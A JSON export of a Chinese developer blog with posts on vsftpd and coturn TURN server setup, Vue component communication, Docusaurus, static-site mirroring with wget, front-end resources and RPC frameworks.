below.114 #chroot_local_user=YES115 #116 # You may specify an explicit list of local users to chroot() to their home117 # directory. If chroot_local_user is YES, then this list becomes a list of118 # users to NOT chroot().119 # (Warning! chroot'ing can be very dangerous. If using chroot, make sure that120 # the user does not have write access to the top level directory within the121 # chroot)122 #chroot_local_user=YES123 #chroot_list_enable=YES124 # (default follows)125 #chroot_list_file=/etc/vsftpd.chroot_list126 #127 # You may activate the \"-R\" option to the builtin ls. This is disabled by128 # default to avoid remote users being able to cause excessive I/O on large129 # sites. However, some broken FTP clients such as \"ncftp\" and \"mirror\" assume130 # the presence of the \"-R\" option, so there is a strong case for enabling it.131 #ls_recurse_enable=YES132 #133 # Customization134 #135 # Some of vsftpd's settings don't fit the filesystem layout by136 # default.137 #138 # This option should be the name of a directory which is empty. Also, the139 # directory should not be writable by the ftp user. This directory is used140 # as a secure chroot() jail at times vsftpd does not require filesystem141 # access.142 secure_chroot_dir=/var/run/vsftpd/empty143 #144 # This string is the name of the PAM service vsftpd will use.145 pam_service_name=vsftpd146 #147 # This option specifies the location of the RSA certificate to use for SSL148 # encrypted connections.149 rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem150 rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key151 ssl_enable=NO152 153 #154 # Uncomment this to indicate that vsftpd use a utf8 filesystem.155 #utf8_filesystem=YES 注释的详细描述 扩展阅读:《Redhat使用Vsftpd服务传输文件》","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[]},{"title":"WebRTC STUN&TURN 服务器","slug":"Web后端/WebRTC TURN&STUN 服务器","date":"2019-06-11T12:52:36.000Z","updated":"2021-12-28T03:24:10.214Z","comments":true,"path":"Web后端/WebRTC TURN&STUN 服务器/","link":"","permalink":"http://yoursite.com/Web后端/WebRTC TURN&STUN 服务器/","excerpt":"","text":"简介coturn 是一个开源的 TURN/STUN 服务器，支持 P2P 穿透。 STUN 服务器用于获取设备的外部网络地址 TURN 服务器是在点对点失败后用于通信中继。 WebRTC 建立连接的步骤大概是这样的： 客户端（浏览器）直接尝试直连； 如果如果直连则通过 STUN 服务器进行穿透； 如果无法穿透则通过 TURN 服务器进行中转。 部署 安装编译依赖工具 1$ sudo apt-get install build-essential libssl-dev openssl 注意apt安装的openssl版本可能太老，会导致编译coturn失败，可以源码安装新版本openssl，参考【Ubuntu 16.04 LTS安装新版OpenSSL】 安装依赖库libevent源码安装才是新版本 123456$ wget https://github.com/libevent/libevent/releases/download/release-2.1.10-stable/libevent-2.1.10-stable.tar.gz$ tar -zxvf libevent-2.1.10-stable.tar.gz$ cd libevent-2.1.10-stable$ ./configure$ make &amp; make install 安装数据库依赖sqlite这一步可以跳过，如果在这里安装sqlite的话，安装coturn会自动检查到。 1$ sudo apt-get install sqlite libsqlite3-dev 安装coturn 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102# 下载$ wget https://github.com/coturn/coturn/archive/4.5.1.1.tar.gz$ tar -zxvf 4.5.1.1.tar.gz$ cd coturn-4.5.1.1# 或者$ git clone https://github.com.cnpmjs.org/coturn/coturn# 编译安装# 4.5.1.1$ ./configure$ make$ sudo make installinstall -d /usr/localinstall -d /usr/local/bininstall -d /usr/local/var/dbinstall -d /usr/local/man/man1install -d /usr/local/etcinstall -d /usr/local/libinstall -d /usr/local/share/examples/turnserverinstall -d /usr/local/share/doc/turnserverinstall -d /usr/local/share/turnserverinstall -d /usr/local/include/turninstall bin/turnserver /usr/local/bininstall bin/turnadmin /usr/local/bininstall bin/turnutils_uclient /usr/local/bininstall bin/turnutils_peer /usr/local/bininstall bin/turnutils_stunclient /usr/local/bininstall bin/turnutils_oauth /usr/local/bininstall bin/turnutils_natdiscovery /usr/local/bininstall man/man1/turnserver.1 /usr/local/man/man1/install man/man1/turnadmin.1 /usr/local/man/man1/install man/man1/turnutils.1 /usr/local/man/man1/install man/man1/turnutils_uclient.1 /usr/local/man/man1/install man/man1/turnutils_stunclient.1 /usr/local/man/man1/install man/man1/turnutils_oauth.1 /usr/local/man/man1/install man/man1/turnutils_natdiscovery.1 /usr/local/man/man1/install man/man1/turnutils_peer.1 /usr/local/man/man1/install man/man1/coturn.1 /usr/local/man/man1/install lib/libturnclient.a /usr/local/libinstall LICENSE /usr/local/share/doc/turnserverinstall README.turnserver /usr/local/share/doc/turnserverinstall README.turnadmin /usr/local/share/doc/turnserverinstall README.turnutils /usr/local/share/doc/turnserverinstall INSTALL /usr/local/share/doc/turnserverinstall postinstall.txt /usr/local/share/doc/turnserverinstall turndb/schema.sql /usr/local/share/doc/turnserverinstall turndb/schema.sql /usr/local/share/turnserverinstall turndb/schema.mongo.sh /usr/local/share/doc/turnserverinstall turndb/schema.mongo.sh /usr/local/share/turnserverinstall turndb/testredisdbsetup.sh /usr/local/share/turnserverinstall turndb/testmongosetup.sh /usr/local/share/turnserverinstall turndb/testsqldbsetup.sql /usr/local/share/turnserverinstall turndb/schema.userdb.redis /usr/local/share/doc/turnserverinstall turndb/schema.userdb.redis /usr/local/share/turnserverinstall turndb/schema.stats.redis /usr/local/share/doc/turnserverinstall turndb/schema.stats.redis /usr/local/share/turnserverif [ -f sqlite/turndb ] ; then install sqlite/turndb /usr/local/var/db/turndb;fi install examples/etc/turnserver.conf /usr/local/etc/turnserver.conf.defaultcp -rpf examples/etc /usr/local/share/examples/turnservercp -rpf examples/scripts /usr/local/share/examples/turnserverrm -rf /usr/local/share/examples/turnserver/scripts/rfc5769.shcp -rpf include/turn/client /usr/local/include/turninstall include/turn/ns_turn_defs.h /usr/local/include/turncat /usr/local/share/doc/turnserver/postinstall.txt==================================================================1) If your system supports automatic start-up system daemon services, then to enable the turnserver as a system service that is automaticallystarted, you have to: a) Create and edit /etc/turnserver.conf or /usr/local/etc/turnserver.conf . Use /usr/local/etc/turnserver.conf.default as an example. b) For user accounts settings: set up SQLite or PostgreSQL or MySQL or MongoDB or Redis database for user accounts. Use /usr/local/share/turnserver/schema.sql as SQL database schema, or use /usr/local/share/turnserver/schema.userdb.redis as Redis database schema description and/or /usr/local/share/turnserver/schema.stats.redis as Redis status &amp; statistics database schema description. If you are using SQLite, the default database location is in /var/db/turndb or in /usr/local/var/db/turndb or in /var/lib/turn/turndb c) add whatever is necessary to enable start-up daemon for the /usr/local/bin/turnserver. 2) If you do not want the turnserver to be a system service, then you can start/stop it \"manually\", using the \"turnserver\" executable with appropriate options (see the documentation). 3) To create database schema, use schema in file /usr/local/share/turnserver/schema.sql. 4) For additional information, run: $ man turnserver $ man turnadmin $ man turnutils ================================================================== 配置coturn（重点） 1234567891011121314151617181920212223$ cd /usr/local/etc$ cp turnserver.conf.default turnserver.conf$ openssl req -x509 -newkey rsa:2048 -keyout turn_server_pkey.pem -out turn_server_cert.pem -days 99999 -nodes $ ifconfig -aens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.0.115 netmask 255.255.255.0 broadcast 192.168.0.255 inet6 fe80::5632:dfa1:378e:7570 prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:0c:29:6c:a8:71 txqueuelen 1000 (Ethernet) RX packets 5037 bytes 6248464 (6.2 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 2856 bytes 226651 (226.6 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1000 (Local Loopback) RX packets 1137 bytes 93030 (93.0 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 1137 bytes 93030 (93.0 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 无数据库配置，【配置参考】 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108$ sudo vim turnserver.conf#与前ifconfig查到的网卡名称一致relay-device=ens33#内网IPlistening-ip=192.168.0.115listening-port=3478tls-listening-port=5349relay-ip=192.168.0.115#公网IPexternal-ip=192.168.0.115relay-threads=10lt-cred-mechcert=/usr/local/etc/turn_server_cert.pempkey=/usr/local/etc/turn_server_pkey.pempidfile=\"/var/run/turnserver.pid\"min-port=49152max-port=65535#用户名密码，创建IceServer时用user=test:123456cli-password=123456$ sudo turnserver -o -a -f -v -user=test:123456 -r MYTest0: log file opened: /var/log/turn_38651_2021-08-03.log0: Listener address to use: 127.0.0.10: Relay address to use: 127.0.0.10: Config file found: /usr/local/etc/turnserver.conf0: RFC 3489/5389/5766/5780/6062/6156 STUN/TURN ServerVersion Coturn-4.5.1.1 'dan Eider'0: Max number of open files/sockets allowed for this process: 10485760: Due to the open files/sockets limitation,max supported number of TURN Sessions possible is: 524000 (approximately)0: ==== Show him the instruments, Practical Frost: ====0: TLS supported0: DTLS supported0: DTLS 1.2 supported0: TURN/STUN ALPN supported0: Third-party authorization (oAuth) supported0: GCM (AEAD) supported0: OpenSSL compile-time version: OpenSSL 1.1.1j 16 Feb 2021 (0x101010af)0: 0: SQLite supported, default database location is /usr/local/var/db/turndb0: Redis is not supported0: PostgreSQL is not supported0: MySQL is not supported0: MongoDB is not supported0: 0: Default Net Engine version: 3 (UDP thread per CPU core)=====================================================0: Domain name: 0: Default realm: MyTest0: SSL23: Certificate file found: /usr/local/etc/turn_server_cert.pem0: SSL23: Private key file found: /usr/local/etc/turn_server_pkey.pem0: ERROR: set_ctx: ERROR: cannot set DH0: TLS1.0: Certificate file found: /usr/local/etc/turn_server_cert.pem0: TLS1.0: Private key file found: /usr/local/etc/turn_server_pkey.pem0: ERROR: set_ctx: ERROR: cannot set DH0: TLS1.1: Certificate file found: /usr/local/etc/turn_server_cert.pem0: TLS1.1: Private key file found: /usr/local/etc/turn_server_pkey.pem0: ERROR: set_ctx: ERROR: cannot set DH0: TLS1.2: Certificate file found: /usr/local/etc/turn_server_cert.pem0: TLS1.2: Private key file found: /usr/local/etc/turn_server_pkey.pem0: ERROR: set_ctx: ERROR: cannot set DH0: TLS cipher suite: DEFAULT0: DTLS: Certificate file found: /usr/local/etc/turn_server_cert.pem0: DTLS: Private key file found: /usr/local/etc/turn_server_pkey.pem0: ERROR: set_ctx: ERROR: cannot set DH0: DTLS1.2: Certificate file found: /usr/local/etc/turn_server_cert.pem0: DTLS1.2: Private key file found: /usr/local/etc/turn_server_pkey.pem0: ERROR: set_ctx: ERROR: cannot set DH0: DTLS cipher suite: DEFAULT$ ps -ef|grep turnserveroot 100411 turnserver -o -a -f -v -user=test:123456 -r MYTest$ sudo lsof -i :3478COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEturnserve 100411 root 13u IPv4 331035 0t0 TCP localhost:3478 (LISTEN)turnserve 100411 root 21u IPv4 331040 0t0 TCP localhost:3478 (LISTEN)turnserve 100411 root 29u IPv4 331045 0t0 TCP localhost:3478 (LISTEN)turnserve 100411 root 37u IPv4 331050 0t0 TCP localhost:3478 (LISTEN)turnserve 100411 root 45u IPv4 331055 0t0 TCP localhost:3478 (LISTEN)turnserve 100411 root 53u IPv4 331060 0t0 TCP localhost:3478 (LISTEN)turnserve 100411 root 61u IPv4 331065 0t0 TCP localhost:3478 (LISTEN)turnserve 100411 root 69u IPv4 331070 0t0 TCP localhost:3478 (LISTEN)turnserve 100411 root 77u IPv4 331075 0t0 TCP localhost:3478 (LISTEN)turnserve 100411 root 84u IPv4 330096 0t0 UDP localhost:3478 turnserve 100411 root 86u IPv4 330097 0t0 UDP localhost:3478 turnserve 100411 root 87u IPv4 330098 0t0 UDP localhost:3478 turnserve 100411 root 88u IPv4 331080 0t0 TCP localhost:3478 (LISTEN)turnserve 100411 root 91u IPv4 330099 0t0 UDP localhost:3478 turnserve 100411 root 92u IPv4 330100 0t0 UDP localhost:3478 turnserve 100411 root 93u IPv4 330101 0t0 UDP localhost:3478 turnserve 100411 root 94u IPv4 330102 0t0 UDP localhost:3478 turnserve 100411 root 95u IPv4 330103 0t0 UDP localhost:3478 turnserve 100411 root 96u IPv4 330104 0t0 UDP localhost:3478 turnserve 100411 root 97u IPv4 330105 0t0 UDP localhost:3478 有输出监听端口的信息说明已经成功启动 有Sqlite配置，【配置参考】 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102$ sudo turnadmin -a -u test -p 123456 -r demo$ sudo vim turnserver.conf #监听端口listening-port=3478#监听的网卡listening-device=ens33#公网ipexternal-ip=192.168.0.115#用户名:密码user=test:123456#一般与turnadmin创建用户时指定的realm一致realm=democli-password=123456$ sudo turnserver -o -a -f -user=test:123456 -v -r demo0: log file opened: /var/log/turn_99525_2021-08-04.log0: Config file found: /usr/local/etc/turnserver.conf0: RFC 3489/5389/5766/5780/6062/6156 STUN/TURN ServerVersion Coturn-4.5.1.1 'dan Eider'0: Max number of open files/sockets allowed for this process: 10485760: Due to the open files/sockets limitation,max supported number of TURN Sessions possible is: 524000 (approximately)0: ==== Show him the instruments, Practical Frost: ====0: TLS supported0: DTLS supported0: DTLS 1.2 supported0: TURN/STUN ALPN supported0: Third-party authorization (oAuth) supported0: GCM (AEAD) supported0: OpenSSL compile-time version: OpenSSL 1.1.1j 16 Feb 2021 (0x101010af)0: 0: SQLite supported, default database location is /usr/local/var/db/turndb0: Redis is not supported0: PostgreSQL is not supported0: MySQL is not supported0: MongoDB is not supported0: 0: Default Net Engine version: 3 (UDP thread per CPU core)=====================================================0: Domain name: 0: Default realm: demo0: Config file found: /usr/local/etc/turn_server_cert.pem0: Config file found: /usr/local/etc/turn_server_pkey.pem0: SSL23: Certificate file found: /usr/local/etc/turn_server_cert.pem0: SSL23: Private key file found: /usr/local/etc/turn_server_pkey.pem0: ERROR: set_ctx: ERROR: cannot set DH0: TLS1.0: Certificate file found: /usr/local/etc/turn_server_cert.pem0: TLS1.0: Private key file found: /usr/local/etc/turn_server_pkey.pem0: ERROR: set_ctx: ERROR: cannot set DH0: TLS1.1: Certificate file found: /usr/local/etc/turn_server_cert.pem0: TLS1.1: Private key file found: /usr/local/etc/turn_server_pkey.pem0: ERROR: set_ctx: ERROR: cannot set DH0: TLS1.2: Certificate file found: /usr/local/etc/turn_server_cert.pem0: TLS1.2: Private key file found: /usr/local/etc/turn_server_pkey.pem0: ERROR: set_ctx: ERROR: cannot set DH0: TLS cipher suite: DEFAULT0: DTLS: Certificate file found: /usr/local/etc/turn_server_cert.pem0: DTLS: Private key file found: /usr/local/etc/turn_server_pkey.pem0: ERROR: set_ctx: ERROR: cannot set DH0: DTLS1.2: Certificate file found: /usr/local/etc/turn_server_cert.pem0: DTLS1.2: Private key file found: /usr/local/etc/turn_server_pkey.pem0: ERROR: set_ctx: ERROR: cannot set DH0: DTLS cipher suite: DEFAULT0: NO EXPLICIT LISTENER ADDRESS(ES) ARE CONFIGURED0: ===========Discovering listener addresses: =========0: Listener address to use: 127.0.0.10: Listener address to use: 192.168.0.1150: Listener address to use: ::10: =====================================================0: Total: 1 'real' addresses discovered0: =====================================================0: NO EXPLICIT RELAY ADDRESS(ES) ARE CONFIGURED0: ===========Discovering relay addresses: =============0: Relay address to use: 192.168.0.1150: Relay address to use: ::10: =====================================================0: Total: 2 relay addresses discovered0: =====================================================$ ps -ef|grep turnserveroot 100608 turnserver -o -a -f -user=test:123456 -v -r demo$ sudo lsof -i :3478COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEturnserve 100608 root 13u IPv4 330422 0t0 TCP localhost:3478 (LISTEN)turnserve 100608 root 17u IPv4 330426 0t0 TCP ubuntu:3478 (LISTEN)turnserve 100608 root 27u IPv4 333118 0t0 UDP localhost:3478 turnserve 100608 root 28u IPv4 330433 0t0 TCP localhost:3478 (LISTEN)turnserve 100608 root 29u IPv4 333119 0t0 UDP localhost:3478 turnserve 100608 root 34u IPv4 333122 0t0 UDP ubuntu:3478 turnserve 100608 root 36u IPv4 333123 0t0 UDP ubuntu:3478 turnserve 100608 root 38u IPv4 330437 0t0 TCP ubuntu:3478 (LISTEN) 测试webrtc-samples提供的测工具测试环境： coturn服务运行在一台“桥接网络适配器”VMWare虚拟机上,网段是192.168.0.1和宿主机一样。 在一台“Net网络适配器”VMWare虚拟机测试ICE，网段是192.168.58.123相当于一个小局域网，结果如图：没有测试出relay效果，只是测试出来了本地网络，coturn还是得部署到公网IP的服务器上才行。 部署到云服务器时记得开放UDP和TCP的3478端口。","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[]},{"title":"MQTT Broker Moquette","slug":"Web后端/MQTT Broker Moquette","date":"2019-06-11T11:52:36.000Z","updated":"2021-12-28T03:24:10.204Z","comments":true,"path":"Web后端/MQTT Broker Moquette/","link":"","permalink":"http://yoursite.com/Web后端/MQTT Broker Moquette/","excerpt":"","text":"MoquetteMoquette是一款开源的MQTT消息代理，整个系统基于java开发，以netty编解码为基础完整实现了MQTT协议的，可以嵌入到你自己的项目中使用。 其他项目netty-mqtt5-codecMoquette的改进项目","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[]},{"title":"前端动画","slug":"前端/前端动画","date":"2019-06-09T14:54:53.000Z","updated":"2021-12-28T03:24:10.257Z","comments":true,"path":"前端/前端动画/","link":"","permalink":"http://yoursite.com/前端/前端动画/","excerpt":"","text":"aos.jsgithub 和 demo aos.js是一款效果超赞的页面滚动元素动画jQuery动画库插件。该动画库可以在页面滚动时提供28种不同的元素动画效果，以及多种easing效果。在页面往回滚动时，元素会恢复到原来的状态。 Flexslider.jsFlexslider - 响应式的 jQuery 内容滚动插件 Animate.cssgithub](https://github.com/daneden/animate.css) 和 demo Animate.css是一个有趣的，跨浏览器的css3动画库","categories":[],"tags":[]},{"title":"静态网站克隆","slug":"前端/静态网站克隆","date":"2019-05-31T11:53:36.000Z","updated":"2021-12-28T03:24:10.267Z","comments":true,"path":"前端/静态网站克隆/","link":"","permalink":"http://yoursite.com/前端/静态网站克隆/","excerpt":"","text":"静态网站克隆，就是将网站的 html/css/js 和图片等文件下载到本地，能离线浏览。 Linux在 linux 上，我们经常用 wget 下载文件，加上参数 -r -k 等参数，可以将静态网站整个下载下来，但是 wget 是单线程下载，可能会比较慢。1wget -r -p -np -k http://localhost -r: 递归 -p: 下载图片等内容 -k: 转换链接 -np: 不追踪父级 Windows在Windows下，可以使用 WebZip 这个软件来下载，这是一个很老的软件了，下载地址 ，基本上整个网站都能下载下来，但是它会加入 WebZip 的注释内容。 预览效果再本地用Nginx、Apache等软件，将代码部署好就可以看到效果了，为了验证离线网站没有依赖网络的资源（如css等），可将本地网络断掉。","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"Vue父子组件通讯","slug":"前端/Vue父子组件通讯","date":"2019-05-31T01:53:36.000Z","updated":"2021-12-28T03:24:10.252Z","comments":true,"path":"前端/Vue父子组件通讯/","link":"","permalink":"http://yoursite.com/前端/Vue父子组件通讯/","excerpt":"","text":"父组件传 值 给子组件 父组件调用子组件的时候 绑定动态属性 1&lt;v-header :title=&quot;title&quot;&gt;&lt;/v-header&gt; 在子组件里面通过 props接收父组件传过来的数据 12345props:[&apos;title&apos;]或者props:&#123;&apos;title&apos;:String &#125; 直接在子组件里面使用 父组件传 函数 给子组件 父组件调用子组件的时候 绑定函数 1&lt;v-header :say-hello=&quot;parentSayHello&quot;&gt;&lt;/v-header&gt; 父组件的函数 12345methods:&#123; parentSayHello(name)&#123; console.log(name + &quot;say hello&quot;); &#125;&#125; 在子组件里面通过 props接收父组件传过来的数据 123456props:&#123; sayHello:&#123; type: Function, require: false, &#125;, &#125; 直接在子组件里面使用 1&lt;button @click=&quot;sayHello(&apos;jack&apos;)&quot;/&gt; 父组件主动调用子组件属性、方法 调用子组件的时候定义一个ref 1&lt;v-header ref=&quot;header&quot;&gt;&lt;/v-header&gt; 在父组件里面通过 12this.$refs.header.属性this.$refs.header.方法 子组件主动调用父组件的属性、方法 直接调用 12this.$parent.数据this.$parent.方法 非父子组件通讯非父子的组件通讯，可以通过Vuex来实现，另外也可定义一个全局的Vue对象，利用这个Vue的通知来通讯。","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"用cnpm安装软件库的一个问题","slug":"前端/用cnpm安装软件库的一个问题","date":"2019-05-30T01:53:36.000Z","updated":"2021-12-28T03:24:10.264Z","comments":true,"path":"前端/用cnpm安装软件库的一个问题/","link":"","permalink":"http://yoursite.com/前端/用cnpm安装软件库的一个问题/","excerpt":"","text":"在一个 Vue-Cli 的项目中发现使用 cnpm install安装依赖库有些小问题，导致在WebStrom上无法识别库的自定义标签，也无法跳转到自定义标签的源码。 举例1cnpm install element-ui -S 使用标签 &lt;el-button/&gt; 时，webstrom提示 Unknown html tag el-button 查看 node_modules 目录，发现element-ui 有两个目录。 12_element-ui@2.8.2@element-uielement-ui 其中element-ui是`_element-ui@2.8.2@element-ui`的引用（Windows下文件夹图标有个箭头）。 而用npm install安装时，就只有element-ui一个目录，WebStrom 可以识别到库的自定义标签，可以跳到自定义标签的源码。 如何更正如果已经使用cnpm安装了软件库，那么如果改为npm呢？ 如果是一两个软件库，使用 uninstall 命令删掉，重新 install 一遍即可。 但比如的整个项目都是用 cnpm install ，直接把node_modules目录删掉，重新执行npm install命令即可。 网速慢的问题参考《npm淘宝源》 对 npm 做配置。","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"网站设计欣赏","slug":"前端/网站设计欣赏","date":"2019-05-22T01:53:36.000Z","updated":"2021-12-28T03:24:10.265Z","comments":true,"path":"前端/网站设计欣赏/","link":"","permalink":"http://yoursite.com/前端/网站设计欣赏/","excerpt":"","text":"站点 全球酷站中心 收集优秀UI组件元素站点 高质量设计网站 优秀的页面设计awwwards 模板站点国内搜索 “网页模板” 大多数是很旧很差的模板，到国外搜索 “website templates free” 或者再加上 &quot;Bootstrap&quot; 会找到相对优质一点的资源。 600+ 个免费的Bootstrap HTML 模板 1 600+ 个免费的Bootstrap HTML 模板 2 bootstrap 模板 free-css.com bootstrap 模板 bootstrapmade.com 企业官网欣赏 emqx emq的官网，设计的风格非常喜欢。 electron electron的官网。 neucloud Vue写的企业网站，一般都认为Vue做企业网站对SEO不友好，但这个网站确实做的不错。 laracasts PHP的Laravel框架效果很好的国外网站 laisitech boostrap做的企业网站 plex.tv 国外网站，设计很好 teambition 国内团队协作软件介绍网站，设计很好","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"高清图库","slug":"前端/高清图库","date":"2019-05-22T01:52:36.000Z","updated":"2021-12-28T03:24:10.268Z","comments":true,"path":"前端/高清图库/","link":"","permalink":"http://yoursite.com/前端/高清图库/","excerpt":"","text":"pixabaystocksnapwallroom网页背景照片查找##网页背景图片生成 参考","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"网站文档docusaurus使用","slug":"docs文档工具/网站文档docusaurus使用","date":"2019-05-10T01:52:36.000Z","updated":"2021-12-28T03:24:10.229Z","comments":true,"path":"docs文档工具/网站文档docusaurus使用/","link":"","permalink":"http://yoursite.com/docs文档工具/网站文档docusaurus使用/","excerpt":"","text":"项目docusaurus 是 Faecbook 专门为开源项目开发者提供的一款易于维护的静态网站创建工具，使用 Markdown即可更新网站。 安装按照文档安装docusaurus 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081$ cnpm install --global docusaurus-init$ docusaurus-initWebsite folder created!Installing latest version of Docusaurus in website.npm WARN deprecated browserslist@1.7.7: Browserslist 2 could fail on reading Browserslist &gt;3.0 config used in other tools.npm WARN deprecated coffee-script@1.12.7: CoffeeScript on NPM has moved to &quot;coffeescript&quot; (no hyphen)&gt; gifsicle@4.0.1 postinstall D:\\SourceCode\\npm\\demo\\website\\node_modules\\gifsicle&gt; node lib/install.js √ gifsicle pre-build test passed successfully&gt; jpegtran-bin@4.0.0 postinstall D:\\SourceCode\\npm\\demo\\website\\node_modules\\jpegtran-bin&gt; node lib/install.js √ jpegtran pre-build test passed successfully&gt; optipng-bin@5.1.0 postinstall D:\\SourceCode\\npm\\demo\\website\\node_modules\\optipng-bin&gt; node lib/install.js √ optipng pre-build test passed successfullynpm notice created a lockfile as package-lock.json. You should commit this file.npm WARN website No descriptionnpm WARN website No repository field.npm WARN website No license field.+ docusaurus@1.9.0added 1064 packages in 65.262sDocusaurus installed in website folder!&gt; @ examples D:\\SourceCode\\npm\\demo\\website&gt; docusaurus-examplesWrote docusaurus scripts to package.json file.demo├── docker-compose.yml├── Dockerfile├── docs│ ├── doc1.md│ ├── doc2.md│ ├── doc3.md│ ├── exampledoc4.md│ └── exampledoc5.md└── website ├── blog │ ├── 2016-03-11-blog-post.md │ ├── 2017-04-10-blog-post-two.md │ ├── 2017-09-25-testing-rss.md │ ├── 2017-09-26-adding-rss.md │ └── 2017-10-24-new-version-1.0.0.md ├── core │ └── Footer.js ├── package-lock.json ├── package.json ├── pages │ └── en │ ├── help.js │ ├── index.js │ └── users.js ├── README.md ├── sidebars.json ├── siteConfig.js └── static ├── css │ └── custom.css └── img ├── favicon.ico ├── oss_logo.png ├── undraw_code_review.svg ├── undraw_monitor.svg ├── undraw_note_list.svg ├── undraw_online.svg ├── undraw_open_source.svg ├── undraw_operating_system.svg ├── undraw_react.svg ├── undraw_tweetstorm.svg └── undraw_youtube_tutorial.svg 运行demo12$ cd website/$ npm start 构建&amp;生成静态Html文件1$ npm run build 这将在 website 目录下生成一个 build 文件夹, 其中包含 website 目录下所有文档和其他页面中所含的 .html 文件。 目录介绍 文档源文件: 包含示例网站 docs 目录，用 Markdown 编写. 博客Blog: 包含示例网站 website/blog 目录，用 Markdown 编写. 页面：包含示例网站顶级页面的文件夹 website/pages。 静态资源与图片：包含供网站使用的静态资源文件夹 website/static 页脚： website/core/Footer.js 文件是一个 React 组件，用于生成 Docusaurus 站点的页脚，它可以由用户定制。 配置文件： website/siteConfig.js 文件是 Docusaurus 的主配置文件。 工具栏： sidebars.json 文件包含文档文件的结构与排序。 官网效果 使用docusaurus的用户所有用户 大部分无法访问，挑了几个 home-assistant minapp dep scalafmt polymath goby","categories":[{"name":"docs文档工具","slug":"docs文档工具","permalink":"http://yoursite.com/categories/docs文档工具/"}],"tags":[{"name":"docs","slug":"docs","permalink":"http://yoursite.com/tags/docs/"}]},{"title":"RPC学习","slug":"Web后端/RPC学习","date":"2019-05-01T01:52:36.000Z","updated":"2021-12-28T03:24:10.211Z","comments":true,"path":"Web后端/RPC学习/","link":"","permalink":"http://yoursite.com/Web后端/RPC学习/","excerpt":"","text":"ThriftApache顶级项目，早期由Facebook开发，集成了序列化/反序列化和传输层，传输层基于TCP，服务端提供高并发NIO等多种模式支持。通过 .thrift文件直接生成客户端和服务端的代码，支持语言种类比较多：1C++, Java, Python, PHP, Ruby, Erlang, Perl, Haskell, C#, Cocoa, JavaScript, Node.js, Smalltalk, OCaml and Delphi and other languages. Thrift支持众多通讯协议： TBinaryProtocol – 一种简单的二进制格式，简单，但没有为空间效率而优化。比文本协议处理起来更快，但更难于调试。 TCompactProtocol – 更紧凑的二进制格式，处理起来通常同样高效。 TDebugProtocol – 一种人类可读的文本格式，用来协助调试。 TDenseProtocol – 与TCompactProtocol类似，将传输数据的元信息剥离。 TJSONProtocol – 使用JSON对数据编码。 TSimpleJSONProtocol – 一种只写协议，它不能被Thrift解析，因为它使用JSON时丢弃了元数据。适合用脚本语言来解析。 gRPCgRPC是由Google主导开发的RPC框架，使用HTTP/2协议并用ProtoBuf作为序列化工具（ProtoBuf的数据是二进制），gRPC和Thrift功能很类似，也是集成了序列化/反序列化和传输层。通过 .proto文件直接生成客户端和服务端的代码，支持的语言有：1C++, Java, Python, PHP, Ruby, C#, Node.js, Go, Android Java, Objective-C, Dart, Web 其中Java的传输层是基于Netty的，Android Java是基于OkHttp。可以看到gRPC不局限于后端微服务的连接，它是支持移动设备端的，完全可以将移动设备、浏览器客户端连接到后端服务，取代目前普遍使用的HTTP RESTful API，免去客户端开发者要编写API接口代码。 Netty + ProtoBuf觉得这是一种不成熟的RPC方案，个人练手练手是不错的选择。但是基于这两货，厉害的开发者可以开发出一套RPC软件。Netty自带ProtoBuf的解码器，所以，通过ProtoBuf序列化/反序列化数据，使用Netty来传输非常方便，gRPC-java 就是基于 Netty + ProtoBuf 实现的。 JSON-RPC是一种基于JSON的跨语言远程调用协议，JSON-RPC 2.0 规范这样描述： JSON-RPC是一个无状态且轻量级的远程过程调用(RPC)协议。 本规范主要定义了一些数据结构及其相关的处理规则。它允许运行在基于socket,http等诸多不同消息传输环境的同一进程中。其使用JSON（RFC 4627）作为数据格式。 认识 JSON-RPC 是以太坊的接口，以太坊的接口基于 HTTP 来实现。JSON-RPC 和 ProtoBuf 是同一层，只定义数据，不参与数据传输。 总结RPC（Remote Procedure Call）—远程过程调用，多用于分布式环境下，该协议允许运行于一台计算机的程序通过网络调用另一台计算机的程序，而程序员无需额外地为这个交互作用编程。 RPC与数据格式，传输方式。传输方式比如上述有TCP也有HTTP，甚至还有UDP。 为什么选择RPC ？ 提高开发效率，开发人员可以把更多精力放在具体的接口实现，而不必考虑数据的底层传输问题 大多数rpc框架都是很多优秀开发人员的智慧结晶，它们的功能实现和执行效率都很优秀 client端和server端必须遵循统一的接口规范，避免产生client和server之间接口或数据局结构不匹配的情况。 